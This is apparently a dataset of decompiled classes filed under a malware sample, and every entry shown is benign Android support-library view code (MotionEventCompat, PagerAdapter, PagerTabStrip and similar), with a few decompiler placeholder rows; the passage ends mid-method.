"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\EclairMotionEventVersionImpl.code","static class EclairMotionEventVersionImpl implements MotionEventVersionImpl {   EclairMotionEventVersionImpl(){   }   @Override public int findPointerIndex(  MotionEvent event,  int pointerId){     return MotionEventCompatEclair.findPointerIndex(event,pointerId);   }   @Override public int getPointerId(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getPointerId(event,pointerIndex);   }   @Override public float getX(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getX(event,pointerIndex);   }   @Override public float getY(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getY(event,pointerIndex);   }   @Override public int getPointerCount(  MotionEvent event){     return MotionEventCompatEclair.getPointerCount(event);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\FroyoViewConfigurationVersionImpl.code","static class FroyoViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {   FroyoViewConfigurationVersionImpl(){   }   @Override public int getScaledPagingTouchSlop(  ViewConfiguration config){     return ViewConfigurationCompatFroyo.getScaledPagingTouchSlop(config);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\GBViewCompatImpl.code","static class GBViewCompatImpl extends BaseViewCompatImpl {   GBViewCompatImpl(){   }   @Override public int getOverScrollMode(  View v){     return ViewCompatGingerbread.getOverScrollMode(v);   }   @Override public void setOverScrollMode(  View v,  int mode){     ViewCompatGingerbread.setOverScrollMode(v,mode);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\GestureDetectorCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6e458853"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\GestureDetectorCompatImpl.code","interface GestureDetectorCompatImpl {   boolean isLongpressEnabled();   boolean onTouchEvent(  MotionEvent motionEvent);   void setIsLongpressEnabled(  boolean z);   void setOnDoubleTapListener(  GestureDetector.OnDoubleTapListener onDoubleTapListener); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\GestureDetectorCompatImplBase.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4c95b2a8"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\GestureDetectorCompatImplJellybeanMr1.code","static class GestureDetectorCompatImplJellybeanMr1 implements GestureDetectorCompatImpl {   private final GestureDetector mDetector;   public GestureDetectorCompatImplJellybeanMr1(  Context context,  GestureDetector.OnGestureListener listener,  Handler handler){     this.mDetector=new GestureDetector(context,listener,handler);   }   @Override public boolean isLongpressEnabled(){     return this.mDetector.isLongpressEnabled();   }   @Override public boolean onTouchEvent(  MotionEvent ev){     return this.mDetector.onTouchEvent(ev);   }   @Override public void setIsLongpressEnabled(  boolean enabled){     this.mDetector.setIsLongpressEnabled(enabled);   }   @Override public void setOnDoubleTapListener(  GestureDetector.OnDoubleTapListener listener){     this.mDetector.setOnDoubleTapListener(listener);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\GestureHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@49c632b1"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\HCViewCompatImpl.code","static class HCViewCompatImpl extends GBViewCompatImpl {   HCViewCompatImpl(){   }   @Override long getFrameTime(){     return ViewCompatHC.getFrameTime();   }   @Override public void setLayerType(  View view,  int layerType,  Paint paint){     ViewCompatHC.setLayerType(view,layerType,paint);   }   @Override public int getLayerType(  View view){     return ViewCompatHC.getLayerType(view);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\HoneycombKeyEventVersionImpl.code","static class HoneycombKeyEventVersionImpl implements KeyEventVersionImpl {   HoneycombKeyEventVersionImpl(){   }   @Override public int normalizeMetaState(  int metaState){     return KeyEventCompatHoneycomb.normalizeMetaState(metaState);   }   @Override public boolean metaStateHasModifiers(  int metaState,  int modifiers){     return KeyEventCompatHoneycomb.metaStateHasModifiers(metaState,modifiers);   }   @Override public boolean metaStateHasNoModifiers(  int metaState){     return KeyEventCompatHoneycomb.metaStateHasNoModifiers(metaState);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\HoneycombMenuVersionImpl.code","static class HoneycombMenuVersionImpl implements MenuVersionImpl {   HoneycombMenuVersionImpl(){   }   @Override public boolean setShowAsAction(  MenuItem item,  int actionEnum){     MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);     return true;   } } static class HoneycombMenuVersionImpl implements MenuVersionImpl {   HoneycombMenuVersionImpl(){   }   @Override public boolean setShowAsAction(  MenuItem item,  int actionEnum){     MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);     return true;   }   @Override public MenuItem setActionView(  MenuItem item,  View view){     return MenuItemCompatHoneycomb.setActionView(item,view);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\HoneycombVelocityTrackerVersionImpl.code","static class HoneycombVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {   HoneycombVelocityTrackerVersionImpl(){   }   @Override public float getXVelocity(  VelocityTracker tracker,  int pointerId){     return VelocityTrackerCompatHoneycomb.getXVelocity(tracker,pointerId);   }   @Override public float getYVelocity(  VelocityTracker tracker,  int pointerId){     return VelocityTrackerCompatHoneycomb.getYVelocity(tracker,pointerId);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ICSViewCompatImpl.code","static class ICSViewCompatImpl extends HCViewCompatImpl {   ICSViewCompatImpl(){   }   @Override public boolean canScrollHorizontally(  View v,  int direction){     return ViewCompatICS.canScrollHorizontally(v,direction);   }   @Override public boolean canScrollVertically(  View v,  int direction){     return ViewCompatICS.canScrollVertically(v,direction);   }   @Override public void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     ViewCompatICS.onPopulateAccessibilityEvent(v,event);   }   @Override public void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     ViewCompatICS.onInitializeAccessibilityEvent(v,event);   }   @Override public void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){     ViewCompatICS.onInitializeAccessibilityNodeInfo(v,info.getInfo());   }   @Override public void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){     ViewCompatICS.setAccessibilityDelegate(v,delegate.getBridge());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\ItemInfo.code","public static class ItemInfo {   Object object;   float offset;   int position;   boolean scrolling;   float widthFactor;   ItemInfo(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\JbMr1ViewCompatImpl.code","static class JbMr1ViewCompatImpl extends JBViewCompatImpl {   JbMr1ViewCompatImpl(){   }   @Override public int getLabelFor(  View view){     return ViewCompatJellybeanMr1.getLabelFor(view);   }   @Override public void setLabelFor(  View view,  int id){     ViewCompatJellybeanMr1.setLabelFor(view,id);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\JBViewCompatImpl.code","static class JBViewCompatImpl extends ICSViewCompatImpl {   JBViewCompatImpl(){   }   @Override public boolean hasTransientState(  View view){     return ViewCompatJB.hasTransientState(view);   }   @Override public void setHasTransientState(  View view,  boolean hasTransientState){     ViewCompatJB.setHasTransientState(view,hasTransientState);   }   @Override public void postInvalidateOnAnimation(  View view){     ViewCompatJB.postInvalidateOnAnimation(view);   }   @Override public void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     ViewCompatJB.postInvalidateOnAnimation(view,left,top,right,bottom);   }   @Override public void postOnAnimation(  View view,  Runnable action){     ViewCompatJB.postOnAnimation(view,action);   }   @Override public void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     ViewCompatJB.postOnAnimationDelayed(view,action,delayMillis);   }   @Override public int getImportantForAccessibility(  View view){     return ViewCompatJB.getImportantForAccessibility(view);   }   @Override public void setImportantForAccessibility(  View view,  int mode){     ViewCompatJB.setImportantForAccessibility(view,mode);   }   @Override public boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return ViewCompatJB.performAccessibilityAction(view,action,arguments);   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     Object compat=ViewCompatJB.getAccessibilityNodeProvider(view);     if (compat != null) {       return new AccessibilityNodeProviderCompat(compat);     }     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\KeyEventCompat.code","public class KeyEventCompat {   static final KeyEventVersionImpl IMPL; interface KeyEventVersionImpl {     boolean metaStateHasModifiers(    int i,    int i2);     boolean metaStateHasNoModifiers(    int i);     int normalizeMetaState(    int i);   } static class BaseKeyEventVersionImpl implements KeyEventVersionImpl {     private static final int META_ALL_MASK=247;     private static final int META_MODIFIER_MASK=247;     BaseKeyEventVersionImpl(){     }     private static int metaStateFilterDirectionalModifiers(    int metaState,    int modifiers,    int basic,    int left,    int right){       boolean wantBasic=(modifiers & basic) != 0;       int directional=left | right;       boolean wantLeftOrRight=(modifiers & directional) != 0;       if (wantBasic) {         if (wantLeftOrRight) {           throw new IllegalArgumentException(""bad arguments"");         }         return metaState & (directional ^ (-1));       }       if (wantLeftOrRight) {         return metaState & (basic ^ (-1));       }       return metaState;     }     @Override public int normalizeMetaState(    int metaState){       if ((metaState & 192) != 0) {         metaState|=1;       }       if ((metaState & 48) != 0) {         metaState|=2;       }       return metaState & 247;     }     @Override public boolean metaStateHasModifiers(    int metaState,    int modifiers){       return metaStateFilterDirectionalModifiers(metaStateFilterDirectionalModifiers(normalizeMetaState(metaState) & 247,modifiers,1,64,128),modifiers,2,16,32) == modifiers;     }     @Override public boolean metaStateHasNoModifiers(    int metaState){       return (normalizeMetaState(metaState) & 247) == 0;     }   } static class HoneycombKeyEventVersionImpl implements KeyEventVersionImpl {     HoneycombKeyEventVersionImpl(){     }     @Override public int normalizeMetaState(    int metaState){       return KeyEventCompatHoneycomb.normalizeMetaState(metaState);     }     @Override public boolean metaStateHasModifiers(    int metaState,    int modifiers){       return KeyEventCompatHoneycomb.metaStateHasModifiers(metaState,modifiers);     }     @Override public boolean metaStateHasNoModifiers(    int metaState){       return KeyEventCompatHoneycomb.metaStateHasNoModifiers(metaState);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombKeyEventVersionImpl();     }  else {       IMPL=new BaseKeyEventVersionImpl();     }   }   public static int normalizeMetaState(  int metaState){     return IMPL.normalizeMetaState(metaState);   }   public static boolean metaStateHasModifiers(  int metaState,  int modifiers){     return IMPL.metaStateHasModifiers(metaState,modifiers);   }   public static boolean metaStateHasNoModifiers(  int metaState){     return IMPL.metaStateHasNoModifiers(metaState);   }   public static boolean hasModifiers(  KeyEvent event,  int modifiers){     return IMPL.metaStateHasModifiers(event.getMetaState(),modifiers);   }   public static boolean hasNoModifiers(  KeyEvent event){     return IMPL.metaStateHasNoModifiers(event.getMetaState());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\KeyEventCompatHoneycomb.code","class KeyEventCompatHoneycomb {   KeyEventCompatHoneycomb(){   }   public static int normalizeMetaState(  int metaState){     return KeyEvent.normalizeMetaState(metaState);   }   public static boolean metaStateHasModifiers(  int metaState,  int modifiers){     return KeyEvent.metaStateHasModifiers(metaState,modifiers);   }   public static boolean metaStateHasNoModifiers(  int metaState){     return KeyEvent.metaStateHasNoModifiers(metaState);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\KeyEventVersionImpl.code","interface KeyEventVersionImpl {   boolean metaStateHasModifiers(  int i,  int i2);   boolean metaStateHasNoModifiers(  int i);   int normalizeMetaState(  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\LayoutParams.code","public static class LayoutParams extends ViewGroup.LayoutParams {   int childIndex;   public int gravity;   public boolean isDecor;   boolean needsMeasure;   int position;   float widthFactor;   public LayoutParams(){     super(-1,-1);     this.widthFactor=0.0f;   }   public LayoutParams(  Context context,  AttributeSet attrs){     super(context,attrs);     this.widthFactor=0.0f;     TypedArray a=context.obtainStyledAttributes(attrs,ViewPager.LAYOUT_ATTRS);     this.gravity=a.getInteger(0,48);     a.recycle();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\MenuCompat.code","public class MenuCompat {   static final MenuVersionImpl IMPL; interface MenuVersionImpl {     boolean setShowAsAction(    MenuItem menuItem,    int i);   } static class BaseMenuVersionImpl implements MenuVersionImpl {     BaseMenuVersionImpl(){     }     @Override public boolean setShowAsAction(    MenuItem item,    int actionEnum){       return false;     }   } static class HoneycombMenuVersionImpl implements MenuVersionImpl {     HoneycombMenuVersionImpl(){     }     @Override public boolean setShowAsAction(    MenuItem item,    int actionEnum){       MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);       return true;     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombMenuVersionImpl();     }  else {       IMPL=new BaseMenuVersionImpl();     }   }   public static boolean setShowAsAction(  MenuItem item,  int actionEnum){     return IMPL.setShowAsAction(item,actionEnum);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\MenuItemCompat.code","public class MenuItemCompat {   static final MenuVersionImpl IMPL;   public static final int SHOW_AS_ACTION_ALWAYS=2;   public static final int SHOW_AS_ACTION_COLLAPSE_ACTION_VIEW=8;   public static final int SHOW_AS_ACTION_IF_ROOM=1;   public static final int SHOW_AS_ACTION_NEVER=0;   public static final int SHOW_AS_ACTION_WITH_TEXT=4; interface MenuVersionImpl {     MenuItem setActionView(    MenuItem menuItem,    View view);     boolean setShowAsAction(    MenuItem menuItem,    int i);   } static class BaseMenuVersionImpl implements MenuVersionImpl {     BaseMenuVersionImpl(){     }     @Override public boolean setShowAsAction(    MenuItem item,    int actionEnum){       return false;     }     @Override public MenuItem setActionView(    MenuItem item,    View view){       return item;     }   } static class HoneycombMenuVersionImpl implements MenuVersionImpl {     HoneycombMenuVersionImpl(){     }     @Override public boolean setShowAsAction(    MenuItem item,    int actionEnum){       MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);       return true;     }     @Override public MenuItem setActionView(    MenuItem item,    View view){       return MenuItemCompatHoneycomb.setActionView(item,view);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombMenuVersionImpl();     }  else {       IMPL=new BaseMenuVersionImpl();     }   }   public static boolean setShowAsAction(  MenuItem item,  int actionEnum){     return IMPL.setShowAsAction(item,actionEnum);   }   public static MenuItem setActionView(  MenuItem item,  View view){     return IMPL.setActionView(item,view);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\MenuItemCompatHoneycomb.code","class MenuItemCompatHoneycomb {   MenuItemCompatHoneycomb(){   }   public static void setShowAsAction(  MenuItem item,  int actionEnum){     item.setShowAsAction(actionEnum);   }   public static MenuItem setActionView(  MenuItem item,  View view){     return item.setActionView(view);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\MenuVersionImpl.code","interface MenuVersionImpl {   boolean setShowAsAction(  MenuItem menuItem,  int i); } interface MenuVersionImpl {   MenuItem setActionView(  MenuItem menuItem,  View view);   boolean setShowAsAction(  MenuItem menuItem,  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\MotionEventCompat.code","public class MotionEventCompat {   public static final int ACTION_HOVER_ENTER=9;   public static final int ACTION_HOVER_EXIT=10;   public static final int ACTION_HOVER_MOVE=7;   public static final int ACTION_MASK=255;   public static final int ACTION_POINTER_DOWN=5;   public static final int ACTION_POINTER_INDEX_MASK=65280;   public static final int ACTION_POINTER_INDEX_SHIFT=8;   public static final int ACTION_POINTER_UP=6;   public static final int ACTION_SCROLL=8;   static final MotionEventVersionImpl IMPL; interface MotionEventVersionImpl {     int findPointerIndex(    MotionEvent motionEvent,    int i);     int getPointerCount(    MotionEvent motionEvent);     int getPointerId(    MotionEvent motionEvent,    int i);     float getX(    MotionEvent motionEvent,    int i);     float getY(    MotionEvent motionEvent,    int i);   } static class BaseMotionEventVersionImpl implements MotionEventVersionImpl {     BaseMotionEventVersionImpl(){     }     @Override public int findPointerIndex(    MotionEvent event,    int pointerId){       return pointerId == 0 ? 0 : -1;     }     @Override public int getPointerId(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return 0;       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float getX(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return event.getX();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float getY(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return event.getY();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public int getPointerCount(    MotionEvent event){       return 1;     }   } static class EclairMotionEventVersionImpl implements MotionEventVersionImpl {     EclairMotionEventVersionImpl(){     }     @Override public int findPointerIndex(    MotionEvent event,    int pointerId){       return MotionEventCompatEclair.findPointerIndex(event,pointerId);     }     @Override public int getPointerId(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getPointerId(event,pointerIndex);     }     @Override public float getX(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getX(event,pointerIndex);     }     @Override public float getY(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getY(event,pointerIndex);     }     @Override public int getPointerCount(    MotionEvent event){       return MotionEventCompatEclair.getPointerCount(event);     }   } static {     if (Build.VERSION.SDK_INT >= 5) {       IMPL=new EclairMotionEventVersionImpl();     }  else {       IMPL=new BaseMotionEventVersionImpl();     }   }   public static int getActionMasked(  MotionEvent event){     return event.getAction() & 255;   }   public static int getActionIndex(  MotionEvent event){     return (event.getAction() & 65280) >> 8;   }   public static int findPointerIndex(  MotionEvent event,  int pointerId){     return IMPL.findPointerIndex(event,pointerId);   }   public static int getPointerId(  MotionEvent event,  int pointerIndex){     return IMPL.getPointerId(event,pointerIndex);   }   public static float getX(  MotionEvent event,  int pointerIndex){     return IMPL.getX(event,pointerIndex);   }   public static float getY(  MotionEvent event,  int pointerIndex){     return IMPL.getY(event,pointerIndex);   }   public static int getPointerCount(  MotionEvent event){     return IMPL.getPointerCount(event);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\MotionEventCompatEclair.code","class MotionEventCompatEclair {   MotionEventCompatEclair(){   }   public static int findPointerIndex(  MotionEvent event,  int pointerId){     return event.findPointerIndex(pointerId);   }   public static int getPointerId(  MotionEvent event,  int pointerIndex){     return event.getPointerId(pointerIndex);   }   public static float getX(  MotionEvent event,  int pointerIndex){     return event.getX(pointerIndex);   }   public static float getY(  MotionEvent event,  int pointerIndex){     return event.getY(pointerIndex);   }   public static int getPointerCount(  MotionEvent event){     return event.getPointerCount();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\MotionEventVersionImpl.code","interface MotionEventVersionImpl {   int findPointerIndex(  MotionEvent motionEvent,  int i);   int getPointerCount(  MotionEvent motionEvent);   int getPointerId(  MotionEvent motionEvent,  int i);   float getX(  MotionEvent motionEvent,  int i);   float getY(  MotionEvent motionEvent,  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\MyAccessibilityDelegate.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2bbdbd5c"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\OnAdapterChangeListener.code","public interface OnAdapterChangeListener {   void onAdapterChanged(  PagerAdapter pagerAdapter,  PagerAdapter pagerAdapter2); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\OnPageChangeListener.code","public interface OnPageChangeListener {   void onPageScrollStateChanged(  int i);   void onPageScrolled(  int i,  float f,  int i2);   void onPageSelected(  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\PageListener.code","public class PageListener extends DataSetObserver implements ViewPager.OnPageChangeListener, ViewPager.OnAdapterChangeListener {   private int mScrollState;   private PageListener(){   }   @Override public void onPageScrolled(  int position,  float positionOffset,  int positionOffsetPixels){     if (positionOffset > 0.5f) {       position++;     }     PagerTitleStrip.this.updateTextPositions(position,positionOffset,false);   }   @Override public void onPageSelected(  int position){     if (this.mScrollState == 0) {       PagerTitleStrip.this.updateText(PagerTitleStrip.this.mPager.getCurrentItem(),PagerTitleStrip.this.mPager.getAdapter());       float offset=PagerTitleStrip.this.mLastKnownPositionOffset >= 0.0f ? PagerTitleStrip.this.mLastKnownPositionOffset : 0.0f;       PagerTitleStrip.this.updateTextPositions(PagerTitleStrip.this.mPager.getCurrentItem(),offset,true);     }   }   @Override public void onPageScrollStateChanged(  int state){     this.mScrollState=state;   }   @Override public void onAdapterChanged(  PagerAdapter oldAdapter,  PagerAdapter newAdapter){     PagerTitleStrip.this.updateAdapter(oldAdapter,newAdapter);   }   @Override public void onChanged(){     PagerTitleStrip.this.updateText(PagerTitleStrip.this.mPager.getCurrentItem(),PagerTitleStrip.this.mPager.getAdapter());     float offset=PagerTitleStrip.this.mLastKnownPositionOffset >= 0.0f ? PagerTitleStrip.this.mLastKnownPositionOffset : 0.0f;     PagerTitleStrip.this.updateTextPositions(PagerTitleStrip.this.mPager.getCurrentItem(),offset,true);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\PagerAdapter.code","public abstract class PagerAdapter {   public static final int POSITION_NONE=-2;   public static final int POSITION_UNCHANGED=-1;   private DataSetObservable mObservable=new DataSetObservable();   public abstract int getCount();   public abstract boolean isViewFromObject(  View view,  Object obj);   public void startUpdate(  ViewGroup container){     startUpdate((View)container);   }   public Object instantiateItem(  ViewGroup container,  int position){     return instantiateItem((View)container,position);   }   public void destroyItem(  ViewGroup container,  int position,  Object object){     destroyItem((View)container,position,object);   }   public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     setPrimaryItem((View)container,position,object);   }   public void finishUpdate(  ViewGroup container){     finishUpdate((View)container);   }   public void startUpdate(  View container){   }   public Object instantiateItem(  View container,  int position){     throw new UnsupportedOperationException(""Required method instantiateItem was not overridden"");   }   public void destroyItem(  View container,  int position,  Object object){     throw new UnsupportedOperationException(""Required method destroyItem was not overridden"");   }   public void setPrimaryItem(  View container,  int position,  Object object){   }   public void finishUpdate(  View container){   }   public Parcelable saveState(){     return null;   }   public void restoreState(  Parcelable state,  ClassLoader loader){   }   public int getItemPosition(  Object object){     return -1;   }   public void notifyDataSetChanged(){     this.mObservable.notifyChanged();   }   public void registerDataSetObserver(  DataSetObserver observer){     this.mObservable.registerObserver(observer);   }   public void unregisterDataSetObserver(  DataSetObserver observer){     this.mObservable.unregisterObserver(observer);   }   public CharSequence getPageTitle(  int position){     return null;   }   public float getPageWidth(  int position){     return 1.0f;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\PagerObserver.code","private class PagerObserver extends DataSetObserver {   private PagerObserver(){   }   @Override public void onChanged(){     ViewPager.this.dataSetChanged();   }   @Override public void onInvalidated(){     ViewPager.this.dataSetChanged();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\PagerTabStrip.code","public class PagerTabStrip extends PagerTitleStrip {   private static final int FULL_UNDERLINE_HEIGHT=1;   private static final int INDICATOR_HEIGHT=3;   private static final int MIN_PADDING_BOTTOM=6;   private static final int MIN_STRIP_HEIGHT=32;   private static final int MIN_TEXT_SPACING=64;   private static final int TAB_PADDING=16;   private static final int TAB_SPACING=32;   private static final String TAG=""PagerTabStrip"";   private boolean mDrawFullUnderline;   private boolean mDrawFullUnderlineSet;   private int mFullUnderlineHeight;   private boolean mIgnoreTap;   private int mIndicatorColor;   private int mIndicatorHeight;   private float mInitialMotionX;   private float mInitialMotionY;   private int mMinPaddingBottom;   private int mMinStripHeight;   private int mMinTextSpacing;   private int mTabAlpha;   private int mTabPadding;   private final Paint mTabPaint;   private final Rect mTempRect;   private int mTouchSlop;   public PagerTabStrip(  Context context){     this(context,null);   }   public PagerTabStrip(  Context context,  AttributeSet attrs){     super(context,attrs);     this.mTabPaint=new Paint();     this.mTempRect=new Rect();     this.mTabAlpha=255;     this.mDrawFullUnderline=false;     this.mDrawFullUnderlineSet=false;     this.mIndicatorColor=this.mTextColor;     this.mTabPaint.setColor(this.mIndicatorColor);     float density=context.getResources().getDisplayMetrics().density;     this.mIndicatorHeight=(int)((3.0f * density) + 0.5f);     this.mMinPaddingBottom=(int)((6.0f * density) + 0.5f);     this.mMinTextSpacing=(int)(64.0f * density);     this.mTabPadding=(int)((16.0f * density) + 0.5f);     this.mFullUnderlineHeight=(int)((1.0f * density) + 0.5f);     this.mMinStripHeight=(int)((32.0f * density) + 0.5f);     this.mTouchSlop=ViewConfiguration.get(context).getScaledTouchSlop();     setPadding(getPaddingLeft(),getPaddingTop(),getPaddingRight(),getPaddingBottom());     setTextSpacing(getTextSpacing());     setWillNotDraw(false);     this.mPrevText.setFocusable(true);     this.mPrevText.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         PagerTabStrip.this.mPager.setCurrentItem(PagerTabStrip.this.mPager.getCurrentItem() - 1);       }     } );     this.mNextText.setFocusable(true);     this.mNextText.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         PagerTabStrip.this.mPager.setCurrentItem(PagerTabStrip.this.mPager.getCurrentItem() + 1);       }     } );     if (getBackground() == null) {       this.mDrawFullUnderline=true;     }   }   public void setTabIndicatorColor(  int color){     this.mIndicatorColor=color;     this.mTabPaint.setColor(this.mIndicatorColor);     invalidate();   }   public void setTabIndicatorColorResource(  int resId){     setTabIndicatorColor(getContext().getResources().getColor(resId));   }   public int getTabIndicatorColor(){     return this.mIndicatorColor;   }   @Override public void setPadding(  int left,  int top,  int right,  int bottom){     if (bottom < this.mMinPaddingBottom) {       bottom=this.mMinPaddingBottom;     }     super.setPadding(left,top,right,bottom);   }   @Override public void setTextSpacing(  int textSpacing){     if (textSpacing < this.mMinTextSpacing) {       textSpacing=this.mMinTextSpacing;     }     super.setTextSpacing(textSpacing);   }   @Override public void setBackgroundDrawable(  Drawable d){     super.setBackgroundDrawable(d);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=d == null;     }   }   @Override public void setBackgroundColor(  int color){     super.setBackgroundColor(color);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=((-16777216) & color) == 0;     }   }   @Override public void setBackgroundResource(  int resId){     super.setBackgroundResource(resId);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=resId == 0;     }   }   public void setDrawFullUnderline(  boolean drawFull){     this.mDrawFullUnderline=drawFull;     this.mDrawFullUnderlineSet=true;     invalidate();   }   public boolean getDrawFullUnderline(){     return this.mDrawFullUnderline;   }   @Override public int getMinHeight(){     return Math.max(super.getMinHeight(),this.mMinStripHeight);   }   @Override public boolean onTouchEvent(  MotionEvent ev){     int action=ev.getAction();     if (action != 0 && this.mIgnoreTap) {       return false;     }     float x=ev.getX();     float y=ev.getY(); switch (action) { case 0:       this.mInitialMotionX=x;     this.mInitialMotionY=y;   this.mIgnoreTap=false; break; case 1: if (x >= this.mCurrText.getLeft() - this.mTabPadding) { if (x > this.mCurrText.getRight() + this.mTabPadding) {   this.mPager.setCurrentItem(this.mPager.getCurrentItem() + 1);   break; } }  else { this.mPager.setCurrentItem(this.mPager.getCurrentItem() - 1); break; 